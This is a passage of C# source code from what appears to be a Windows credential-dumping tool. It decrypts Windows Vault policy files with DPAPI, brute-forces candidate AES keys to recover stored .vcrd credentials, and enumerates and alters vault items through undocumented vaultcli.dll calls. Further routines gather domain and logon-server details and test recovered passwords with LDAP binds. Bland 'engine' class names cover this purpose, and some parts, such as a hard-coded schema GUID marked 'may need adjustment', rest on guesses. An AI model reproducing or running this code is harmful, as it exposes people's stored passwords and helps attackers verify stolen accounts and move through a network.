                            string decryptedContent = DecryptCredentialFile(vcrdPath, aes256Key);

                            var cred = new VaultCredential
                            {
                                FriendlyName = Path.GetFileNameWithoutExtension(vcrdPath),
                                Resource = ExtractFieldFromContent(decryptedContent, "Resource"),
                                Identity = ExtractFieldFromContent(decryptedContent, "Identity"),
                                Authenticator = ExtractFieldFromContent(decryptedContent, "Authenticator"),
                                SchemaId = Guid.Parse(vaultGuid),
                                LastModified = 0
                            };

                            credentials.Add(cred);
                        }
                        catch
                        {
                            // If AES-256 fails, try AES-128
                            try
                            {
                                string decryptedContent = DecryptCredentialFile(vcrdPath, aes128Key);

                                var cred = new VaultCredential
                                {
                                    FriendlyName = Path.GetFileNameWithoutExtension(vcrdPath),
                                    Resource = ExtractFieldFromContent(decryptedContent, "Resource"),
                                    Identity = ExtractFieldFromContent(decryptedContent, "Identity"),
                                    Authenticator = ExtractFieldFromContent(decryptedContent, "Authenticator"),
                                    SchemaId = Guid.Parse(vaultGuid),
                                    LastModified = 0
                                };

                                credentials.Add(cred);
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }
        }
        catch { }

            return credentials;
        }
        */

        public class VaultDecryptionProbe
        {
            public string VaultGuid { get; set; }
            public string PolicyPath { get; set; }
            public int CredentialFileCount { get; set; }
            public int DecryptedCredentialCount { get; set; }
            public string Status { get; set; }
            public string Detail { get; set; }
        }

        private static void AddCandidateKey(List<byte[]> keys, HashSet<string> seen, byte[] source, int offset, int length)
        {
            if (source == null || offset < 0 || length <= 0 || (offset + length) > source.Length)
                return;

            byte[] key = new byte[length];
            Array.Copy(source, offset, key, 0, length);
            if (key.All(b => b == 0))
                return;

            string fingerprint = Convert.ToBase64String(key);
            if (seen.Add(fingerprint))
                keys.Add(key);
        }

        private static List<byte[]> BuildCandidateKeys(byte[] decryptedPolicy)
        {
            List<byte[]> keys = new List<byte[]>();
            HashSet<string> seen = new HashSet<string>(StringComparer.Ordinal);

            AddCandidateKey(keys, seen, decryptedPolicy, 112, 16);
            AddCandidateKey(keys, seen, decryptedPolicy, 128, 32);

            int scanLimit = Math.Min(decryptedPolicy.Length, 512);
            for (int offset = 0; offset + 16 <= scanLimit; offset += 16)
                AddCandidateKey(keys, seen, decryptedPolicy, offset, 16);

            for (int offset = 0; offset + 32 <= scanLimit; offset += 16)
                AddCandidateKey(keys, seen, decryptedPolicy, offset, 32);

            return keys;
        }

        private static bool MatchesPattern(byte[] source, int offset, byte[] pattern)
        {
            if (source == null || pattern == null || offset < 0 || (offset + pattern.Length) > source.Length)
                return false;

            for (int i = 0; i < pattern.Length; i++)
            {
                if (source[offset + i] != pattern[i])
                    return false;
            }

            return true;
        }

        private static void AddPolicyBlobCandidate(List<byte[]> blobs, HashSet<string> seen, byte[] policyBytes, int startOffset, int length)
        {
            if (policyBytes == null || startOffset < 0 || length <= 0 || (startOffset + length) > policyBytes.Length)
                return;

            string fingerprint = startOffset.ToString() + ":" + length.ToString();
            if (!seen.Add(fingerprint))
                return;

            byte[] blob = new byte[length];
            Array.Copy(policyBytes, startOffset, blob, 0, length);
            blobs.Add(blob);
        }

        private static IEnumerable<byte[]> ExtractPolicyBlobCandidates(byte[] policyBytes)
        {
            List<byte[]> blobs = new List<byte[]>();
            HashSet<string> seen = new HashSet<string>(StringComparer.Ordinal);

            if (policyBytes == null || policyBytes.Length == 0)
                return blobs;

            for (int offset = 0; offset <= policyBytes.Length - DpapiBlobMagic.Length; offset++)
            {
                if (!MatchesPattern(policyBytes, offset, DpapiBlobMagic))
                    continue;

                int blobStart = offset;
                if (offset >= 4 && BitConverter.ToInt32(policyBytes, offset - 4) == 1)
                    blobStart = offset - 4;

                List<int> candidateLengths = new List<int>();

                if (blobStart >= 4)
                {
                    int lengthFromHeader = BitConverter.ToInt32(policyBytes, blobStart - 4);
                    if (lengthFromHeader > 0 && (blobStart + lengthFromHeader) <= policyBytes.Length)
                        candidateLengths.Add(lengthFromHeader);
                }

                if (blobStart >= 8)
                {
                    int lengthFromAdjacentField = BitConverter.ToInt32(policyBytes, blobStart - 8);
                    if (lengthFromAdjacentField > 0 && (blobStart + lengthFromAdjacentField) <= policyBytes.Length)
                        candidateLengths.Add(lengthFromAdjacentField);
                }

                candidateLengths.Add(policyBytes.Length - blobStart);

                foreach (int length in candidateLengths.Distinct())
                {
                    AddPolicyBlobCandidate(blobs, seen, policyBytes, blobStart, length);
                }
            }

            if (blobs.Count == 0)
                blobs.Add(policyBytes);

            return blobs;
        }

        private static bool TryDecryptPolicyFile(byte[] policyBytes, out byte[] decryptedPolicy, out string detail)
        {
            decryptedPolicy = null;
            detail = "No DPAPI payload candidate found";

            int candidateIndex = 0;
            List<string> errors = new List<string>();
            foreach (byte[] candidate in ExtractPolicyBlobCandidates(policyBytes))
            {
                try
                {
                    decryptedPolicy = System.Security.Cryptography.ProtectedData.Unprotect(
                        candidate,
                        null,
                        System.Security.Cryptography.DataProtectionScope.CurrentUser);

                    detail = string.Format("Unprotected DPAPI payload candidate #{0} ({1} bytes)", candidateIndex, candidate.Length);
                    return true;
                }
                catch (System.Security.Cryptography.CryptographicException ex)
                {
                    if (errors.Count < 3)
                        errors.Add(string.Format("candidate #{0} ({1} bytes): {2}", candidateIndex, candidate.Length, ex.Message));
                }

                candidateIndex++;
            }

            detail = errors.Count > 0 ? string.Join(" | ", errors) : detail;
            return false;
        }

        private static bool LooksLikeCredentialPayload(string content)
        {
            if (string.IsNullOrWhiteSpace(content))
                return false;

            int printable = content.Count(c => !char.IsControl(c) || c == '\r' || c == '\n' || c == '\t');
            bool mostlyPrintable = printable >= Math.Max(8, (int)(content.Length * 0.80));
            bool hasCredentialMarkers =
                content.IndexOf("Resource", StringComparison.OrdinalIgnoreCase) >= 0 ||
                content.IndexOf("Identity", StringComparison.OrdinalIgnoreCase) >= 0 ||
                content.IndexOf("Authenticator", StringComparison.OrdinalIgnoreCase) >= 0 ||
                content.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0 ||
                content.IndexOf("target=", StringComparison.OrdinalIgnoreCase) >= 0;

            return mostlyPrintable && hasCredentialMarkers;
        }

        private static bool TryDecryptCredentialFile(string vcrdPath, IEnumerable<byte[]> candidateKeys, out string decryptedContent, out string detail)
        {
            decryptedContent = null;
            detail = null;

            if (!File.Exists(vcrdPath))
            {
                detail = "Credential file not found";
                return false;
            }

            byte[] encryptedData = File.ReadAllBytes(vcrdPath);
            if (encryptedData.Length < 32)
            {
                detail = "Credential file too small";
                return false;
            }

            byte[] iv = new byte[16];
            Array.Copy(encryptedData, 16, iv, 0, 16);

            byte[] ciphertext = new byte[encryptedData.Length - 32];
            Array.Copy(encryptedData, 32, ciphertext, 0, ciphertext.Length);

            List<string> errors = new List<string>();

            foreach (byte[] key in candidateKeys)
            {
                try
                {
                    using (var aes = System.Security.Cryptography.Aes.Create())
                    {
                        aes.Key = key;
                        aes.IV = iv;
                        aes.Mode = System.Security.Cryptography.CipherMode.CBC;
                        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;

                        using (var decryptor = aes.CreateDecryptor())
                        {
                            byte[] plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                            string unicode = Encoding.Unicode.GetString(plaintext).TrimEnd('\0');
                            if (LooksLikeCredentialPayload(unicode))
                            {
                                decryptedContent = unicode;
                                detail = string.Format("Decrypted with {0}-bit key", key.Length * 8);
                                return true;
                            }

                            string utf8 = Encoding.UTF8.GetString(plaintext).TrimEnd('\0');
                            if (LooksLikeCredentialPayload(utf8))
                            {
                                decryptedContent = utf8;
                                detail = string.Format("Decrypted with {0}-bit key", key.Length * 8);
                                return true;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (errors.Count < 3)
                        errors.Add(ex.Message);
                }
            }

            detail = errors.Count > 0 ? string.Join(" | ", errors) : "No candidate key produced a recognizable credential payload";
            return false;
        }

        public static List<VaultDecryptionProbe> ProbeVaultFiles()
        {
            List<VaultDecryptionProbe> probes = new List<VaultDecryptionProbe>();

            try
            {
                string vaultBasePath = GetVaultPath();
                if (!Directory.Exists(vaultBasePath))
                    return probes;

                foreach (string vaultDir in Directory.GetDirectories(vaultBasePath))
                {
                    string vaultGuid = Path.GetFileName(vaultDir);
                    string policyPath = Path.Combine(vaultDir, "Policy.vpol");
                    string[] vcrdFiles = Directory.GetFiles(vaultDir, "*.vcrd");

                    VaultDecryptionProbe probe = new VaultDecryptionProbe
                    {
                        VaultGuid = vaultGuid,
                        PolicyPath = policyPath,
                        CredentialFileCount = vcrdFiles.Length,
                        DecryptedCredentialCount = 0,
                        Status = "NOT-ATTEMPTED",
                        Detail = string.Empty
                    };

                    try
                    {
                        if (!File.Exists(policyPath))
                        {
                            probe.Status = "NO-POLICY";
                            probe.Detail = "Policy.vpol not found";
                            probes.Add(probe);
                            continue;
                        }

                        if (vcrdFiles.Length == 0)
                        {
                            probe.Status = "NO-FILES";
                            probe.Detail = "No .vcrd credential files found";
                            probes.Add(probe);
                            continue;
                        }

                        byte[] encryptedPolicy = File.ReadAllBytes(policyPath);
                        byte[] decryptedPolicy;
                        string policyDetail;
                        if (!TryDecryptPolicyFile(encryptedPolicy, out decryptedPolicy, out policyDetail))
                            throw new System.Security.Cryptography.CryptographicException(policyDetail);

                        List<byte[]> candidateKeys = BuildCandidateKeys(decryptedPolicy);
                        if (candidateKeys.Count == 0)
                        {
                            probe.Status = "NO-KEYS";
                            probe.Detail = string.IsNullOrEmpty(policyDetail)
                                ? "Policy.vpol decrypted but no candidate AES keys were identified"
                                : policyDetail + " | no candidate AES keys were identified";
                            probes.Add(probe);
                            continue;
                        }

                        List<string> failures = new List<string>();
                        foreach (string vcrdPath in vcrdFiles)
                        {
                            string content;
                            string detail;
                            if (TryDecryptCredentialFile(vcrdPath, candidateKeys, out content, out detail))
                            {
                                probe.DecryptedCredentialCount++;
                            }
                            else if (failures.Count < 3)
                            {
                                failures.Add(Path.GetFileName(vcrdPath) + ": " + detail);
                            }
                        }

                        if (probe.DecryptedCredentialCount > 0)
                        {
                            probe.Status = "DECRYPTED";
                            probe.Detail = string.Format("{0}; recovered {1} of {2} credential file(s)", policyDetail, probe.DecryptedCredentialCount, probe.CredentialFileCount);
                        }
                        else
                        {
                            probe.Status = "DECRYPT-FAILED";
                            probe.Detail = failures.Count > 0
                                ? policyDetail + " | " + string.Join(" | ", failures)
                                : policyDetail + " | Policy.vpol decrypted, but no .vcrd file produced a recognizable payload";
                        }
                    }
                    catch (System.Security.Cryptography.CryptographicException ex)
                    {
                        probe.Status = "POLICY-DPAPI-FAIL";
                        probe.Detail = ex.Message;
                    }
                    catch (Exception ex)
                    {
                        probe.Status = "PROBE-ERROR";
                        probe.Detail = ex.Message;
                    }

                    probes.Add(probe);
                }
            }
            catch
            {
            }

            return probes;
        }

        /// <summary>
        /// Helper to extract field values from decrypted credential content
        /// Handles variable encoding and null-terminated strings
        /// </summary>
        private static string ExtractFieldFromContent(string content, string fieldName)
    {
        try
        {
            // Look for common field patterns in decrypted data
            // Format may vary; this handles multiple common patterns
            int index = content.IndexOf(fieldName, StringComparison.OrdinalIgnoreCase);
            if (index == -1) return string.Empty;

            // Skip field name and delimiters
            index += fieldName.Length;
            while (index < content.Length && (content[index] == ':' || content[index] == '=' || content[index] == ' '))
                index++;

            // Extract value up to next null or field marker
            StringBuilder value = new StringBuilder();
            while (index < content.Length && content[index] != '\0' && content[index] != '\n')
            {
                if (char.IsControl(content[index]) && content[index] != '\t')
                    break;
                value.Append(content[index]);
                index++;
            }

            return value.ToString().Trim();
        }
        catch
        {
            return string.Empty;
        }
    }
}

// ------------------------------------------------------------------
// Vault API (vaultcli.dll) - Undocumented, use with caution
// ------------------------------------------------------------------
public static class VaultNative
{
    // DLL name
    private const string VaultDll = "vaultcli.dll";

    // Vault open flags
    public const uint VAULT_OPEN_FLAG_NONE = 0;

    // Common Windows Vault schema GUID (may need adjustment)
    public static readonly Guid VaultSchemaWindows = new Guid("3c1b1a8d-9b0b-4b6f-9c1e-8f7b1b3d5c4a");

    // Item element types
    public enum VAULT_ELEMENT_TYPE : uint
    {
        Invalid = 0,
        String = 1,
        Binary = 2,
        Dword = 3,
        Guid = 4,
        Unknown = 5
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4, CharSet = CharSet.Unicode)]
    public struct VAULT_ITEM_ELEMENT
    {
        public VAULT_ELEMENT_TYPE Type;
        public uint Size;           // Size in bytes
        public IntPtr Data;
        public IntPtr Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4, CharSet = CharSet.Unicode)]
    public struct VAULT_ITEM
    {
        public Guid SchemaId;
        public IntPtr pszCredentialFriendlyName;
        public IntPtr pResourceElement;      // VAULT_ITEM_ELEMENT*
        public IntPtr pIdentityElement;      // VAULT_ITEM_ELEMENT*
        public IntPtr pAuthenticatorElement; // VAULT_ITEM_ELEMENT*
        public ulong LastModified;
        public uint Flags;
        public uint PropertiesCount;
        public IntPtr pProperties;           // VAULT_ITEM_PROPERTY*
    }

    // Native functions
    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultOpenVault(
        ref Guid vaultGuid,
        uint flags,
        out IntPtr vaultHandle
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultCloseVault(
        IntPtr vaultHandle
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultEnumerateItems(
        IntPtr vaultHandle,
        uint flags,
        out uint itemCount,
        out IntPtr itemEnumHandle
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultGetItem(
        IntPtr vaultHandle,
        ref Guid schemaId,
        IntPtr pResourceElement,
        IntPtr pIdentityElement,
        IntPtr pAuthenticatorElement,
        uint flags,
        out IntPtr ppItem
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultCreateItem(
        IntPtr vaultHandle,
        ref VAULT_ITEM pItem,
        uint flags
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultDeleteItem(
        IntPtr vaultHandle,
        ref Guid schemaId,
        IntPtr pResourceElement,
        IntPtr pIdentityElement,
        IntPtr pAuthenticatorElement,
        uint flags
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultEnumerateItemsNext(
        IntPtr enumHandle,
        uint flags,
        out IntPtr ppItem
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultEnumerateItemsClose(
        IntPtr enumHandle
    );

    [DllImport(VaultDll, SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int VaultFree(
        IntPtr pMemory
    );

    // Helper to create a VAULT_ITEM_ELEMENT from a string
    public static IntPtr CreateStringElement(string value)
    {
        if (string.IsNullOrEmpty(value))
            return IntPtr.Zero;

        IntPtr ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(VAULT_ITEM_ELEMENT)));
        VAULT_ITEM_ELEMENT elem = new VAULT_ITEM_ELEMENT
        {
            Type = VAULT_ELEMENT_TYPE.String,
            Size = (uint)((value.Length + 1) * 2), // including null terminator
            Data = Marshal.StringToCoTaskMemUni(value),
            Reserved = IntPtr.Zero
        };
        Marshal.StructureToPtr(elem, ptr, false);
        return ptr;
    }

    // Helper to free an element
    public static void FreeElement(IntPtr pElement)
    {
        if (pElement == IntPtr.Zero) return;
        VAULT_ITEM_ELEMENT elem = (VAULT_ITEM_ELEMENT)Marshal.PtrToStructure(pElement, typeof(VAULT_ITEM_ELEMENT));
        if (elem.Data != IntPtr.Zero) Marshal.FreeCoTaskMem(elem.Data);
        Marshal.FreeCoTaskMem(pElement);
    }

    // Helper to read string from element
    public static string GetStringFromElement(IntPtr pElement)
    {
        if (pElement == IntPtr.Zero) return null;
        VAULT_ITEM_ELEMENT elem = (VAULT_ITEM_ELEMENT)Marshal.PtrToStructure(pElement, typeof(VAULT_ITEM_ELEMENT));
        if (elem.Type != VAULT_ELEMENT_TYPE.String || elem.Data == IntPtr.Zero)
            return null;
        return Marshal.PtrToStringUni(elem.Data);
    }
}

// Managed wrapper for a Vault item
public class VaultCredential
{
    public string FriendlyName { get; set; }
    public string Resource { get; set; }
    public string Identity { get; set; }
    public string Authenticator { get; set; }
    public Guid SchemaId { get; set; }
    public ulong LastModified { get; set; }

    public VaultCredential() { }

    public static VaultCredential FromNativeItem(IntPtr pItem)
    {
        if (pItem == IntPtr.Zero) return null;
        try
        {
            VaultNative.VAULT_ITEM item = (VaultNative.VAULT_ITEM)Marshal.PtrToStructure(pItem, typeof(VaultNative.VAULT_ITEM));
            string resource = VaultNative.GetStringFromElement(item.pResourceElement);
            string identity = VaultNative.GetStringFromElement(item.pIdentityElement);
            string authenticator = VaultNative.GetStringFromElement(item.pAuthenticatorElement);
            string friendlyName = Marshal.PtrToStringUni(item.pszCredentialFriendlyName);

            var cred = new VaultCredential
            {
                FriendlyName = friendlyName,
                Resource = resource,
                Identity = identity,
                Authenticator = authenticator,
                SchemaId = item.SchemaId,
                LastModified = item.LastModified
            };
            return cred;
        }
        catch (Exception)
        {
            return null;
        }
    }

    public void Dispose()
    {
        // Nothing to free; the item was already freed by the enumerator.
    }
}

// Vault manager class
public class VaultManager : IDisposable
{
    private IntPtr vaultHandle = IntPtr.Zero;
    private Guid vaultGuid;

    public int LastOpenHResult { get; private set; }
    public int LastEnumerateHResult { get; private set; }
    public int LastEnumerateNextHResult { get; private set; }
    public int LastReportedItemCount { get; private set; }
    public string LastEnumerationStage { get; private set; }
    public bool LastEnumerateItemsNextMissing { get; private set; }

    public VaultManager(Guid vaultSchemaId)
    {
        vaultGuid = vaultSchemaId;
        int hr = VaultNative.VaultOpenVault(ref vaultGuid, VaultNative.VAULT_OPEN_FLAG_NONE, out vaultHandle);
        LastOpenHResult = hr;
        LastEnumerationStage = "VaultOpenVault";
        if (hr != 0 || vaultHandle == IntPtr.Zero)
            throw new Exception(string.Format("Failed to open vault. HRESULT: 0x{0:X8}", hr));
    }

    public void Dispose()
    {
        if (vaultHandle != IntPtr.Zero)
        {
            VaultNative.VaultCloseVault(vaultHandle);
            vaultHandle = IntPtr.Zero;
        }
    }

    public List<VaultCredential> EnumerateItems()
    {
        List<VaultCredential> items = new List<VaultCredential>();
        LastEnumerateHResult = 0;
        LastEnumerateNextHResult = 0;
        LastReportedItemCount = 0;
        LastEnumerateItemsNextMissing = false;
        LastEnumerationStage = "VaultEnumerateItems";
        uint count;
        IntPtr enumHandle = IntPtr.Zero;
        int hr = VaultNative.VaultEnumerateItems(vaultHandle, 0, out count, out enumHandle);
        LastEnumerateHResult = hr;
        LastReportedItemCount = (int)count;

        if (hr != 0 || enumHandle == IntPtr.Zero)
            return items;

        try
        {
            for (uint i = 0; i < count; i++)
            {
                IntPtr pItem;
                LastEnumerationStage = "VaultEnumerateItemsNext";
                hr = VaultNative.VaultEnumerateItemsNext(enumHandle, 0, out pItem);
                LastEnumerateNextHResult = hr;

                if (hr != 0 || pItem == IntPtr.Zero)
                    break;

                var cred = VaultCredential.FromNativeItem(pItem);
                if (cred != null)
                    items.Add(cred);

                try { VaultNative.VaultFree(pItem); } catch { }
            }
        }
        catch (EntryPointNotFoundException)
        {
            LastEnumerateItemsNextMissing = true;
            throw;
        }
        finally
        {
            try
            {
                VaultNative.VaultEnumerateItemsClose(enumHandle);
            }
            catch (EntryPointNotFoundException)
            {
                // VaultEnumerateItemsClose doesn't exist on this system
            }
            catch (Exception)
            {
                // Silently ignore other errors during cleanup
            }
        }
        return items;
    }

    public string GetLastEnumerationSummary()
    {
        if (LastOpenHResult != 0)
            return string.Format("VaultOpenVault HRESULT: 0x{0:X8}", LastOpenHResult);

        if (LastEnumerateItemsNextMissing)
            return "VaultEnumerateItemsNext export is unavailable on this system";

        if (LastEnumerateHResult != 0)
            return string.Format("VaultEnumerateItems HRESULT: 0x{0:X8}", LastEnumerateHResult);

        if (LastEnumerateNextHResult != 0)
            return string.Format("VaultEnumerateItemsNext HRESULT: 0x{0:X8}", LastEnumerateNextHResult);

        if (LastReportedItemCount == 0)
            return "VaultEnumerateItems returned zero items";

        return string.Format("VaultEnumerateItems reported {0} item(s)", LastReportedItemCount);
    }

    public void CreateItem(string friendlyName, string resource, string identity, string authenticator, Guid schemaId)
    {
        IntPtr pResource = VaultNative.CreateStringElement(resource);
        IntPtr pIdentity = VaultNative.CreateStringElement(identity);
        IntPtr pAuthenticator = VaultNative.CreateStringElement(authenticator);
        IntPtr pFriendlyName = Marshal.StringToCoTaskMemUni(friendlyName);

        try
        {
            // Create a VAULT_ITEM structure
            VaultNative.VAULT_ITEM item = new VaultNative.VAULT_ITEM
            {
                SchemaId = schemaId,
                pszCredentialFriendlyName = pFriendlyName,
                pResourceElement = pResource,
                pIdentityElement = pIdentity,
                pAuthenticatorElement = pAuthenticator,
                LastModified = 0,
                Flags = 0,
                PropertiesCount = 0,
                pProperties = IntPtr.Zero
            };

            int hr = VaultNative.VaultCreateItem(vaultHandle, ref item, 0);
            if (hr != 0)
            {
                // VaultCreateItem failed - try fallback with CredWrite
                FallbackCreateItemViaCredWrite(friendlyName, resource, identity, authenticator);
            }
        }
        finally
        {
            if (pFriendlyName != IntPtr.Zero) Marshal.FreeCoTaskMem(pFriendlyName);
            VaultNative.FreeElement(pResource);
            VaultNative.FreeElement(pIdentity);
            VaultNative.FreeElement(pAuthenticator);
        }
    }

    private void FallbackCreateItemViaCredWrite(string friendlyName, string resource, string identity, string authenticator)
    {
        // Use standard Windows Credentials API as fallback
        IntPtr blob = Marshal.StringToCoTaskMemUni(authenticator);
        try
        {
            SecurityEngineMatrix.CREDENTIAL cred = new SecurityEngineMatrix.CREDENTIAL
            {
                Flags = 0,
                Type = (int)CredentialType.Generic,
                TargetName = resource,
                Comment = friendlyName,
                LastWritten = 0,
                CredentialBlobSize = (authenticator.Length + 1) * 2,
                CredentialBlob = blob,
                Persist = (int)PersistenceType.LocalComputer,
                AttributeCount = 0,
                Attributes = IntPtr.Zero,
                TargetAlias = null,
                UserName = identity
            };

            bool result = SecurityEngineMatrix.CredWrite(ref cred, 0);
            if (!result)
            {
                throw new Exception("Fallback CredWrite also failed");
            }
        }
        finally
        {
            if (blob != IntPtr.Zero) Marshal.FreeCoTaskMem(blob);
        }
    }

    public void DeleteItem(VaultCredential cred)
    {
        if (cred == null) throw new ArgumentNullException("cred");

        Guid schemaId = cred.SchemaId;

        // Recreate the element pointers from the stored strings
        IntPtr pResource = VaultNative.CreateStringElement(cred.Resource);
        IntPtr pIdentity = VaultNative.CreateStringElement(cred.Identity);
        IntPtr pAuthenticator = VaultNative.CreateStringElement(cred.Authenticator);

        try
        {
            int hr = VaultNative.VaultDeleteItem(
                vaultHandle,
                ref schemaId,
                pResource,
                pIdentity,
                pAuthenticator,
                0
            );

            if (hr != 0)
                throw new Exception(string.Format("VaultDeleteItem failed. HRESULT: 0x{0:X8}", hr));
        }
        finally
        {
            // Clean up the allocated element structures
            if (pResource != IntPtr.Zero) VaultNative.FreeElement(pResource);
            if (pIdentity != IntPtr.Zero) VaultNative.FreeElement(pIdentity);
            if (pAuthenticator != IntPtr.Zero) VaultNative.FreeElement(pAuthenticator);
        }
    }

    // Optionally, implement update by delete+create
    public void UpdateItem(VaultCredential oldCred, string newFriendlyName, string newResource, string newIdentity, string newAuthenticator)
    {
        DeleteItem(oldCred);
        CreateItem(newFriendlyName, newResource, newIdentity, newAuthenticator, oldCred.SchemaId);
    }
}

// ------------------------------------------------------------------
// NETAPI32 Functions for Domain Credential Enumeration
// ------------------------------------------------------------------
public class DomainCredentialEngine
{
    [DllImport("netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetGetJoinInformation(
        string server,
        out IntPtr nameBuffer,
        out int type
    );

    [DllImport("netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetApiBufferFree(IntPtr buffer);

    [DllImport("netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetWkstaUserGetInfo(
        string servername,
        int level,
        out IntPtr bufPtr
    );

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct WKSTA_USER_INFO_1
    {
        public string wkui1_username;
        public string wkui1_logon_domain;
        public string wkui1_logon_server;
        public string wkui1_oth_domains;
    }

    public static string GetCurrentDomain()
    {
        try
        {
            IntPtr nameBuffer = IntPtr.Zero;
            int type = 0;
            int result = NetGetJoinInformation(null, out nameBuffer, out type);

            if (result == 0 && nameBuffer != IntPtr.Zero)
            {
                string domain = Marshal.PtrToStringUni(nameBuffer);
                NetApiBufferFree(nameBuffer);
                return domain ?? "WORKGROUP";
            }
            return "WORKGROUP";
        }
        catch
        {
            return "WORKGROUP";
        }
    }

    public static string GetLogonServer()
    {
        try
        {
            IntPtr bufPtr = IntPtr.Zero;
            int result = NetWkstaUserGetInfo(null, 1, out bufPtr);

            if (result == 0 && bufPtr != IntPtr.Zero)
            {
                WKSTA_USER_INFO_1 userInfo = (WKSTA_USER_INFO_1)Marshal.PtrToStructure(bufPtr, typeof(WKSTA_USER_INFO_1));
                NetApiBufferFree(bufPtr);
                return userInfo.wkui1_logon_server ?? "N/A";
            }
            return "N/A";
        }
        catch
        {
            return "N/A";
        }
    }
}

// ------------------------------------------------------------------
// Certificate Validation & Analysis Engine
// ------------------------------------------------------------------
public class CertificateValidationEngine
{
    public class CertificateInfo
    {
        public string Thumbprint { get; set; }
        public bool IsValid { get; set; }
        public string Subject { get; set; }
        public DateTime NotBefore { get; set; }
        public DateTime NotAfter { get; set; }
        public int KeySize { get; set; }
    }

    public static List<CertificateInfo> EnumerateCertificates()
    {
        List<CertificateInfo> certs = new List<CertificateInfo>();
        try
        {
            var store = new System.Security.Cryptography.X509Certificates.X509Store(
                System.Security.Cryptography.X509Certificates.StoreName.My,
                System.Security.Cryptography.X509Certificates.StoreLocation.CurrentUser
            );
            store.Open(System.Security.Cryptography.X509Certificates.OpenFlags.ReadOnly);

            foreach (var cert in store.Certificates)
            {
                certs.Add(new CertificateInfo
                {
                    Thumbprint = cert.Thumbprint,
                    IsValid = System.DateTime.UtcNow >= cert.NotBefore && System.DateTime.UtcNow <= cert.NotAfter,
                    Subject = cert.Subject,
                    NotBefore = cert.NotBefore,
                    NotAfter = cert.NotAfter,
                    KeySize = GetCertificateKeySize(cert)
                });
            }
            store.Close();
        }
        catch { }
        return certs;
    }

    private static int GetCertificateKeySize(System.Security.Cryptography.X509Certificates.X509Certificate2 cert)
    {
        try
        {
            return cert.PublicKey.Key.KeySize;
        }
        catch
        {
            // Fallback for newer .NET versions that deprecated PublicKey.Key
            try
            {
                using (var rsa = cert.GetRSAPublicKey())
                {
                    return (rsa != null) ? rsa.KeySize : 0;
                }
            }
            catch
            {
                return 0;
            }
        }
    }
}

// ------------------------------------------------------------------
// Credential Testing & Validation Engine
// ------------------------------------------------------------------
public class CredentialTestingEngine
{
    public class TestResult
    {
        public string CredentialTarget { get; set; }
        public string TestMethod { get; set; }
        public bool Success { get; set; }
        public string ResultMessage { get; set; }
        public System.DateTime TestTime { get; set; }
        public int ResponseTime { get; set; }
    }

    public static TestResult TestLDAPCredential(string domain, string username, string password)
    {
        var result = new TestResult
        {
            CredentialTarget = domain,
            TestMethod = "LDAP",
            TestTime = System.DateTime.UtcNow
        };

        try
        {
            var startTime = System.DateTime.UtcNow;
            System.DirectoryServices.DirectoryEntry entry = new System.DirectoryServices.DirectoryEntry(
                "LDAP://" + domain,
                username,
                password,
                System.DirectoryServices.AuthenticationTypes.Secure
            );

            object nativeObject = entry.NativeObject;
            result.Success = true;
            result.ResultMessage = "LDAP bind successful";
            result.ResponseTime = (int)(System.DateTime.UtcNow - startTime).TotalMilliseconds;
        }
        catch (System.Exception ex)
        {
            result.Success = false;
            result.ResultMessage = ex.Message;
        }

        return result;
    }
}

// ------------------------------------------------------------------
// Credential Strength & Analysis Engine
// ------------------------------------------------------------------
public class CredentialAnalysisEngine
{
    public class CredentialMetrics
    {
        public string Target { get; set; }
        public int StrengthScore { get; set; }
        public bool HasUppercase { get; set; }
        public bool HasLowercase { get; set; }
        public bool HasNumbers { get; set; }
        public bool HasSpecialChars { get; set; }
        public int PasswordLength { get; set; }
        public int EstimatedCrackTimeMinutes { get; set; }
        public string RiskLevel { get; set; }
    }

    public static CredentialMetrics AnalyzeCredentialStrength(string password)
    {
        var metrics = new CredentialMetrics
        {
            PasswordLength = (password != null) ? password.Length : 0
        };

        if (string.IsNullOrEmpty(password))
        {
            metrics.RiskLevel = "Critical";
            metrics.StrengthScore = 0;
            return metrics;
        }

        metrics.HasUppercase = System.Text.RegularExpressions.Regex.IsMatch(password, "[A-Z]");
        metrics.HasLowercase = System.Text.RegularExpressions.Regex.IsMatch(password, "[a-z]");
        metrics.HasNumbers = System.Text.RegularExpressions.Regex.IsMatch(password, "[0-9]");
        metrics.HasSpecialChars = System.Text.RegularExpressions.Regex.IsMatch(password, "[!@#\\$%^&*()_+\\\\-=\\[\\]{};\\':\\\"\\\\|,.<>/?]");

        int score = 0;
        if (metrics.HasUppercase) score += 20;
        if (metrics.HasLowercase) score += 20;
        if (metrics.HasNumbers) score += 20;
        if (metrics.HasSpecialChars) score += 20;

        if (metrics.PasswordLength >= 12) score += 20;
        else if (metrics.PasswordLength >= 8) score += 10;

        metrics.StrengthScore = System.Math.Min(100, score);

        double entropyPerChar = 0;
        if (metrics.HasLowercase) entropyPerChar += 26;
        if (metrics.HasUppercase) entropyPerChar += 26;
        if (metrics.HasNumbers) entropyPerChar += 10;
        if (metrics.HasSpecialChars) entropyPerChar += 32;

